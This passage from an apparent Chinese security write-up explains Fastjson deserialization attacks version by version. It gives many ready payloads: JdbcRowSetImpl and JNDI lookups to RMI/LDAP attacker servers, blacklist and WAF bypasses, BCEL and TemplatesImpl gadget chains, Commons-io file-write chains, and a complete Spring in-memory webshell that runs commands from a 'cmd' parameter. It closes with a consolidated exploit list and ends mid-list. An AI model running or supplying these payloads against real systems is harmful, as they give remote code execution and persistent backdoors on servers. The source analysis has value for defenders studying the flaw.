![image](images/attach-d4732f01e573afad8948177db20bc7f1a3f328fe.png)​

在上述的逻辑当中，看看GPT如何解释

![image](images/attach-61f63907e98819f11ff7974fd504c0e29c159864.png)​

其实也可以看明白就是类似截取字符，把第一个字符跟倒数第一个字符进行截取(那么想到上一个版本的fastjson是`L`​跟`;`​，并且这个版本的黑名单是hash进行混淆了，并且也给出了加密的代码，所以说(牛子)很容易想到是先前的过滤，那么跟CTF一样，他过滤了一次，但是并没有过滤多次，所以双写绕过即可)

‍

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{" +
                "\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/nhdzhn\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}

```

![image](images/attach-74ba27095caba2dc224ed988ff65d03d2d9a9c7e.png)​

‍

### fastjson=1.2.43

1.2.43版本修改了`checkAutoType()`​的部分代码，对于LL等开头结尾的字符串直接抛出异常。

![image](images/attach-b0f3545286b4b60c3b4573433dbc5f8e8df93621.png)​

但他也没对`[`​进行限制啊？

我们可以通过`[{`​绕过，Payload如下

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{" +
                "\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/nhdzhn\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```

![image](images/attach-be6ac4c5ef591dfefac056b01bf830395fed5d0f.png)​

原理的话首先`[`​是可以进入loadclass的逻辑的，但是Java处理的时候是存在json解析有问题的所以进行了报错

![image](images/attach-2061e6f4322504b5209d21dbc101a18aee9e1a56.png)​

```java
Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,, pos 42, json : {"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/nhdzhn", "autoCommit":true}
```

那么看看GPT怎么说

![image](images/attach-61f63907e98819f11ff7974fd504c0e29c159864.png)​

其实就是一个json字符串的解析，所以加上去就好了

加上后仍然报错，依旧是一一样的问题，所以加上`{`​即可

![image](images/attach-2979f266017123a486232903ae0085d371f44c1d.png)​

‍

### fastjson1.2.25-1.2.47通杀

#### 影响版本

1.2.25-1.2.32:

未开启AutoTypeSupport时能成功利用

1.2.33-1.2.47:

无论是否开启AutoTypeSupport都能成功利用

‍

并且传入的是java.lang.class在下面也能绕过黑名单，重点还是看第二个键值解析。

‍

##### 1.2.25<=Fastjson<=1.2.32

先来继续查看这个`checkAutoType`​方法，因为没有开启AutoTypeSupport，所以就不会进入这个if黑白名单判断的逻辑，他就会有两种加载类的模式，如果说我们能够在这两种加载类的模式下把我们恶意类加载进去导致绕过了黑白名单，这是不是也是一种恶意类加载呢

![image](images/attach-c5c36710e63c6bddd418fe2d3fee9a77f97bec19.png)​

1. `TypeUtils.getClassFromMapping(typeName)`​ 这个mapping中找这个类

步进这个Mapping，得到mapping如下

![image](images/attach-6332a2efac3a565b8f6b05b30ac898202607a912.png)​

再步进一下mapping发现是一个private的实例化`ConcurrentHashMap`​对象

![image](images/attach-19344175b877cc1f70e9cce8682a2d8104c58810.png)​

那么由于知道这里是一个entry，所以就进行`mappings.put`​方法的搜索，发现在<span style="font-weight:bold;">TypeUtils.loadClass</span> 有调用到

![image](images/attach-8b9584c615d759c27fb30993303a9469864194c1.png)​

再次全局搜索看哪里调用了 `TypeUtils.loadClass()`​

存在5处调用

![image](images/attach-d0b3295e59b49cf70a10c64e337203d6166b3a94.png)​

但其实这五处全是

1. 要开启<span style="font-weight:bold;">autoType</span>
2. 类在白名单内
3. 传不了参数

最后在`com.alibaba.fastjson.serializer.MiscCodec.deserialze`​中分析

![image](images/attach-672a4bc231314d60733820c20aaa092bbf5e7674.png)​

发现是继承了 `ObjectSerializer`​ `ObjectDeserializer`​ 两个反序列化的父类

先看看调用的代码和传入的参数

![image](images/attach-1b4fca098e4972828b71814caf12e841b537548c.png)​

参数为 `strVal, parser.getConfig().getDefaultClassLoader()`​

先看看 `strVal`​ 是如何传入的

![image](images/attach-a7160d3453ed5fa07bf5e0a3e4ed769e9ff6e973.png)​

在这个266行当中可以看到代码为 `strVal = (String)objVal;`​

所以跟进一下`objVal`​

![image](images/attach-83a92f7811e1cfe200334b114ab8c9c02171cafe.png)​

![image](images/attach-a71894a63ba35e3fb813e9bc6a26076df22cae60.png)​

然后整个链子也很清晰了，就是把我们在json中传入的val中的内容给到这个`strVal`​然后他会进行loadclass后载入mapping成为一个字符串的缓存，这样子就绕开了黑白名单限制了加载到缓存中以后，在下一次checkAutoType的时候，直接就返回了，绕过了检验的部分直接执行

‍

‍

‍

‍

‍

‍

2. `this.deserializers.findClass(typeName);`​ 去这里找这个类

如果上面的无法加载类则进入这个逻辑，从 `deserializers.findClass(typeName)`​ 中获取类

![image](images/attach-5cfe61995951276f5d02b7449c69c77765d1a5e5.png)​

![image](images/attach-9c79cc6859dbd6835dce502d1242f422dff39c8c.png)​

确实是可以写入数据的，但是去找一下谁调用了`putDeserializer`​ 但似乎是找不到可控的调用点，所以关注点就应该在上述方法中

‍

‍

‍

‍

‍

‍

EXP

```java
import com.alibaba.fastjson.JSON;

public class Fastjson6 {
    public static void main(String[] args) throws Exception{
        String payload = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"rmi://127.0.0.1:1099/evilObject\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}
```

‍

‍

‍

##### 1.2.33<=Fastjson<=1.2.47

首先要思考一下为什么要分成两个部分？因为上面的版本开了`AutoTypeSupport`​ 是不成功的，而往后的版本是可以成功的，为什么呢？

![image](images/attach-192bc8d40997a15273f17cf47cef7db0d053039d.png)​

这一句话解释的非常清楚，就是说 在第一个键值载入缓存的

```java
TypeUtils.getClassFromMapping(typeName) == null
```

这一串是不成立的，但是在1.2.25-1.2.32之间，他们开启的`AutoTypeSupport`​的时候，并没有这个语句，从而导致了不论你载入缓存没有，都会进入黑名单，所以都会被ban掉，而不知道为什么反而后面的版本加上了所以直接绕过了

‍

‍

### fastjson<=1.2.68

<https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ>

<https://mp.weixin.qq.com/s/OvRyrWFZLGu3bAYhOPR4KA>

在这个版本当中官方修复了这个缓存的地方，

![image](images/attach-40ae149b1911c0b58c879ec2f9ecd93827adc766.png)​

但是他更新了一个 `safeMode`​ 如果开启了safeMode，那么autoType就会被完全禁止。不过在这个版本里默认是为false，后面的版本默认为true会直接抛出异常。 接着在下面的if中判断是否在期望类的黑名单中，而AutoCloseable不在黑名单中，所以给expectClassFlag赋值为true。

‍

来看一下这个<span style="font-weight:bold;">checkAutoType函数</span>

![image](images/attach-cedf0ff5500d94cf5b51e4890aec65f965dbc904.png)​

### fastjson=1.2.62

```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
```

‍

### fastjson = 1.2.66

‍

```json
// 需要autotype true
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}
```

‍

‍

‍

‍

‍

‍

信息的探测
-----

### 版本探测

去掉花括号不闭合的话，是会把版本号给露出来的

![image](images/attach-e4bf793113b675680d0ed419674c5df35b766228.png)​

源码中可以看到 当解析器没读到}时，在报错中就会把版本号一起带出

![image](images/attach-d0b3295e59b49cf70a10c64e337203d6166b3a94.png)​

以下探测是存在fastjson并且可以加载字节码情况

### 操作系统探测

```java
        String osName = System.getProperty("os.name").toLowerCase();
        System.out.println(osName);
        if (osName.contains("nix") || osName.contains("nux") || osName.contains("mac"))
        {
            Thread.sleep(3000);
        } else if (osName.contains("win")) {
            Thread.sleep(6000);
        } else {
            Thread.sleep(9000);
        }
```

‍

### 中间件探测

```java
        Map stackTraces = Thread.getAllStackTraces();
        for (Map.Entry entry : stackTraces.entrySet()) {
            StackTraceElement[] stackTraceElements = entry.getValue();
            for (StackTraceElement element : stackTraceElements) {
// element.getClassName().contains("org.springframework.web"
                if (element.getClassName().contains("org.apache.catalina.core")) {
                    Thread.sleep(5000);
                    return;
                }
            }
        }
```

![image](images/attach-242fc330be13b039e506a6616825423b2eafd3e6.png)​

‍

### 探测JDK版本

```java
// 获取 Java 版本
        String javaVersion = System.getProperty("java.version");
// 解析主版本号
        int majorVersion = Integer.parseInt(javaVersion.split("\\.")[1]);
// 进⾏版本判断
        switch (majorVersion) {
            case 5:
                Thread.sleep(1000);
                break;
            case 6:
                Thread.sleep(2000);
                break;
            case 7:
                Thread.sleep(3000);
                break;
            case 8:
                Thread.sleep(4000);
                break;
            default:
                Thread.sleep(5000);
                break;

```

‍

[记一次失败的Fastjson漏洞利用.pdf](assets/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-20231209135615-stythrp.pdf)

‍

Fastjson 不出网利用
--------------

<https://xz.aliyun.com/t/12492#toc-3>

### TemplatesImpl

这种利用方式比较苛刻，需要parse或者parseObject第二个参数为`Feature.SupportNonPublicField`​，否则无法访问。 因为TemplatesImpl中`_bytecodes`​却是私有属性，`_name`​也是私有域，fastjson只能反序列化public

‍

这种怎么打不出网呢？

- 对静态资源写入内容

![image](images/attach-1491b4c57cf878074971a38c79ecf4834af7682f.png)​

- TemplatesImpl内存马

打spring内存马进去

```java
package com.exmple;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Method;

//回显spring Controller内存马

public class TemplatesImplSpringController extends AbstractTranslet {
    public TemplatesImplSpringController() throws Exception{
        super();
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Method method2 = TemplatesImplSpringController.class.getMethod("test");
        PatternsRequestCondition url = new PatternsRequestCondition("/shell");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        TemplatesImplSpringController inject = new TemplatesImplSpringController("aaa");
        mappingHandlerMapping.registerMapping(info, inject, method2);

    }
    public TemplatesImplSpringController(String aaa) {

    }
    public void test() throws Exception {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        try {
            String arg0 = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } else {
                response.sendError(404);
            }
        } catch (Exception e) {
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) {
        try {
            new TemplatesImplSpringController();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

编译成class文件直接加载恶意类即可

‍

‍

‍

‍

### BasicDataSource(BCEL攻击)

(需要dbcp或tomcat-dbcp的依赖)

导入依赖

```xml

    org.apache.tomcat
    tomcat-dbcp
    9.0.63

```

这条利用链主要是利用tomcat中`com.sun.org.apache.bcel.internal.util.ClassLoader#loadclass`​方法加载bcel字节码，之后调用defineClass进行加载字节码

先是判断了是否存在`$$BCEL$$`​

![image](images/attach-527294a871f7d9aa53e9dc21dc74db0ef6f31829.png)​

然后进行 `createClass`​ 进行BECL的解码

‍

‍

![image](images/attach-34e3820778a9c6b23a6874b44a39794f0f3ac9d0.png)​

‍

再看一下 `org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection`​方法中，这里调用了createDataSource方法

![image](images/attach-b81675a87215cd576ca7412f57e5490dd9542b84.png)​

跟进一下`createDataSource()`​

![image](images/attach-0e1ffbae61e4df708a4acd761894d301f327e25e.png)​

这里调用了`this.createConnectionFactory()`​ 再次跟进一下

![image](images/attach-30e807e9a71cd6d2e1af4212f5395fba40aef5d5.png)​

发现是把我们传入的东西作为参数调用了`createDriver`​方法执行，再次 跟进

![image](images/attach-a296f3e8d1336adbe1a4a54c81bf86c6af184385.png)​

可以看到这里是`Class.forName`​将类加载进来，并且设置了`initialize`​参数为true【其实就是告诉Java虚拟机是否执⾏”类初始化而staic就是在类初始化加载的】而`Class.forName`​方法实际上也是调用的`CLassLoader`​ 来实现的。所以1和3都是可控的

发现最终在这行代码中 `driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);`​ 将我们的BCEL语句直接被反射寻找类去加载

‍

那么后半段链子已经搞清楚了，现在目的就是搞清楚，是如何调用我们指定类的`getConnection`​呢？可是再来仔细看一下这个类

‍

![image](images/attach-96027f9ef575ccc6d3bcc3672cdc52cefac0324f.png)​

`public Connection getConnection()`​

他的返回值是 `Connection`​

`public interface Connection  extends Wrapper, AutoCloseable {`​

并没有继承上述的五个啊，这就不符合他默认调用geter的方法了！

但这里就是一个fastjson的一个小trick了，如果在原先的json字符串上再套上一层`{}`​，就会吧原先的整体当做一个key来认为，来看一下poc

![image](images/attach-a71894a63ba35e3fb813e9bc6a26076df22cae60.png)​

可以发现 aaa为key 后面的为value，但是再套一层的话，就可以发现整体为key，value为bbb了，那么这么做的用意是什么呢？

‍

解释：

将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法：

在`DefaultJSONParser.java#parseObject`​中找到对key进行toString方法的调用

![image](images/attach-5ffadeb2e0ea077075561a6ceb1596b8578c54c7.png)​

而且JSONObject是Map的子类，当调用`toString`​的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到`getConnection`​方法

‍

EXP

```json
{
    {
        "aaa": {
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
            //这里是tomcat>8的poc，如果小于8的话用到的类是
            //org.apache.tomcat.dbcp.dbcp.BasicDataSource
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "bbb"
}
```

‍

恶意类

```java
public class Poc{
    public Poc(){
        try{
            Runtime.getRuntime().exec(new String[]{"open -a calculator"});
        } catch (Exception e) {
        }
    }

//输出BECL语句
package com.exmple;

import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public  class Bcel {

    public static void main(String[] args) throws IOException {
        Path path = Paths.get("/Users/ajie/Desktop/fastjson/target/classes/com/exmple/Poc.class(绝对路径)");
        byte[] bytes = Files.readAllBytes(path);
        System.out.println(bytes.length);
        String result = Utility.encode(bytes,true);
        BufferedWriter bw = new BufferedWriter(new FileWriter("res.txt"));
        bw.write("$$BCEL$$" + result);
        bw.close();
    }
}
```

那么这条链子就结束，具体的用法跟TemplatesImpl链子差不多，可以加载恶意类的字节码来打内存马

‍

‍

### Commons-io 写文件/webshell

存在这个依赖

```xml

  commons-io
  commons-io
  2.5

```

‍

##### Jre8 原始poc

```json
{
    "x":{
        "@type":"java.lang.AutoCloseable",
        "@type":"sun.rmi.server.MarshalOutputStream",
        "out":{
            "@type":"java.util.zip.InflaterOutputStream",
            "out":{
                "@type":"java.io.FileOutputStream",
                "file":"/tmp/dest.txt",
                "append":false
            },
            "infl":{
                "input":"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="
            },
            "bufLen":1048576
        },
        "protocolVersion":1
    }
}
```

‍

##### commons-io 2.0 - 2.6 版本：

‍

```json
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
```

‍

##### commons-io 2.7 - 2.8.0 版本：

```json
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
        "start":0,
        "end":2147483647
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "charsetName":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
```

‍

### C3P0二次序列化 之 hex序列化字节加载器

‍

‍

‍

‍

$ref
----

ref是fastjson特有的JSONPath语法，用来引用之前出现的对象

‍

因为调用geter是有限制的，对于不满足getter的方法的时候我们该怎么解决呢？当fastjson>=1.2.36的时候，可以使用`$ref`​方式调用getter

举个例子

```java
public class test {
    private String cmd;

    public void setCmd(String cmd) {
        System.out.println("seter call");
        this.cmd = cmd;
    }

    public String getCmd() throws IOException {
        System.out.println("geter call");
        Runtime.getRuntime().exec(cmd);
        return cmd;
    }
}
```

‍

```java
public class ref_fastjson {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "[{\"@type\":\"org.example.Test\",\"cmd\":\"calc\"},{\"$ref\":\"$[0].cmd\"}]";
        JSON.parse(payload);
    }
}
```

![image](images/attach-386441d01c14545f7b201e5fb6ae0c3edcf510c4.png)​

这其实不就是一个数组吗，fastjson解析到`$ref`​会判断为是一个引用，`$[0]`​表示的是数组里的第一个元素，则`$[0].cmd`​表示的是获取第一个元素的cmd属性的值。

‍

进来后并没有处理什么，而是跟进`handleResovleTask`​ 代码仅仅只是给他赋多了一个属性

![image](images/attach-2c671b118f3a9f70a0619c5ef78ba66750e7007c.png)​

然后会获取`ref`​这个key的value，然后吧这两个值作为参数传入`JSONPath.eval`​中

![image](images/attach-574c3f4d3096736054e4a6b541ba8a3aaa963296.png)​

然后将value的值再次eval

![image](images/attach-2760e35e95e55a55bea83ee30a80d26d5226bb02.png)​

这里有一个`init()`​

![image](images/attach-cd3114310d221fc568c7fba1fc007e9742f3d7a4.png)​

跟进后发现不满足条件走了下面代码

![image](images/attach-2979f266017123a486232903ae0085d371f44c1d.png)​

注意看`explain()`​函数，这个函数的作用是把$ref的value解析成segment，Segment是定义在JSONPath类的一个interface，然后explain()会把一个完整的JSONPath拆分成小的处理逻辑 最终`JSONPath.eval`​ 最终会调用到`getPropertyValue`​ 函数，会尝试调用fieldInfo的get函数或者用反射的方式调用getter

![image](images/attach-db69bb9915b59e84ef2a07d8ef62a178dccf40f3.png)​

‍

‍

‍

‍

‍

‍

‍

‍

‍

‍

‍

Fastjson 关键字绕过
--------------

查看 `fastjson-1.2.24.jar!\com\alibaba\fastjson\parser\JSONLexerBase.java`​

可以找到 `JSONLexerBase.scanSymbol`​这个函数是fastjson用来处理json字符串的函数

也可以发现存在以下特殊代码

```java
                    case 'u':
                        char c1 = this.next();
                        char c2 = this.next();
                        char c3 = this.next();
                        char c4 = this.next();
                        int val = Integer.parseInt(new String(new char[]{c1, c2, c3, c4}), 16);
                        hash = 31 * hash + val;
                        this.putChar((char)val);
                        break;

                    case 'x':
                        char x1 = this.ch = this.next();
                        x2 = this.ch = this.next();
                        int x_val = digits[x1] * 16 + digits[x2];
                        char x_char = (char)x_val;
                        hash = 31 * hash + x_char;
                        this.putChar(x_char);
```

当输入的字符是形如`\u`​或者`\x`​的情况下fastjson是会对其进行解码操作的,fastjson支持字符串的Unicode编码和十六进制编码 所以默认情况下是可以通过unicode编码和16进制来进行绕过的

![image](images/attach-ebcd6f629d81440a7954492ba9cdee2d0f1b67a4.png)​

![image](images/attach-412d7a5ec21a812b1675ad083e83d48bb90da9f8.png)​

‍

Fastjson绕waf
------------

##### 结合Feature词法分析器进行混淆绕过

FastJson在序列化和反序列化的过程中提供了很多特性,例如Feature.DisableFieldSmartMatch。如果没有选择该Feature,那么在反序列的过程中，FastJson会自动把下划线命名的Json字符串转化到驼峰式命名的Java对象字段中

会存在以下的一些Feature语法

```java
features |= Feature.AutoCloseSource.getMask();
features |= Feature.InternFieldNames.getMask();
features |= Feature.UseBigDecimal.getMask();
features |= Feature.AllowUnQuotedFieldNames.getMask();
features |= Feature.AllowSingleQuotes.getMask();
features |= Feature.AllowArbitraryCommas.getMask();
features |= Feature.SortFeidFastMatch.getMask();
features |= Feature.IgnoreNotMatch.getMask();
```

![image](images/attach-2760e35e95e55a55bea83ee30a80d26d5226bb02.png)​

![image](images/attach-ee67b2a5c2166d755362b53c3d800efa038e4dfc.png)​

```java
/*\u001a{/*y4tacker*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}*/
```

‍

![image](images/attach-9c79cc6859dbd6835dce502d1242f422dff39c8c.png)​

‍

5. Content-Type设置为通配符`*/*`​来绕过相关的检查

![image](images/attach-8bb193aa3a58aad369a783c992a3779a59195939.png)​

‍

EXP
---

1.2.24

##### <=1.2.24

‍

```java
import com.alibaba.fastjson.JSON;

public class Fastjson_Jdbc_RMI {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```

‍

```java
        String payload = "{" +
                "\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_outputProperties\":\"{ }\", " +
                "\"_name\":\"a.b\" " +
                "\"_tfactory\":\"{ }\", " +
                "\"_bytecodes\":[\"base64\"] "+
                "}";

```

‍

##### 1.2.25-1.2.41

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{" +
                "\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/nhdzhn\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```

‍

##### 1.2.42

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{" +
                "\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/nhdzhn\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}

```

‍

##### 1.2.43

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
public class Jdbc {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{" +
                "\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/nhdzhn\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}

```

‍

##### 1.2.25-1.2.47通杀

```java
import com.alibaba.fastjson.JSON;

public class Fastjson6 {
    public static void main(String[] args) throws Exception{
        String payload = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"rmi://127.0.0.1:1099/evilObject\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}
```

##### Fastjson的智能匹配解析

1. 使用`-`​混淆字段名

